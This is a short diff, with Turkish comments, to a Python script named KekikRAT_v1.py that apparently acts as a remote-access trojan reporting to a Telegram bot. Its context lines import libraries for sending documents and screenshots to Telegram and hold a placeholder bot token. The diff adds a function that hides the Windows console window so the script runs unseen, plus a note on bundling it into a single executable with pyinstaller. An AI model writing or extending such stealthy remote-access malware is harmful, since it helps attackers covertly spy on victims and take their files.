@@ -15,6 +15,12 @@ import requests             # Telegram'a Belge ve Ekran görüntüsü göndermek
 import telebot              # Esas oğlanımız TeleBot
 
 #Hadi Başlayalım..
+def WindowsTerminaliGizle(): # Windows'da betiği çalıştırdıktan sonra terminalin görünmez olması için fonksiyonumuz
+    import win32console, win32gui
+    Terminal = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(Terminal, 0)
+#WindowsTerminaliGizle() # Eğer Windows'da Terminalin gizlenmesini istiyosanız aktifleştirin
+# -- pyinstaller --onefile KekikRAT_v1.py --
 
 # / Telegram Bağlantısı ################################################
 Bot_Token = "XXXX:XXXX"                                # Bot Token
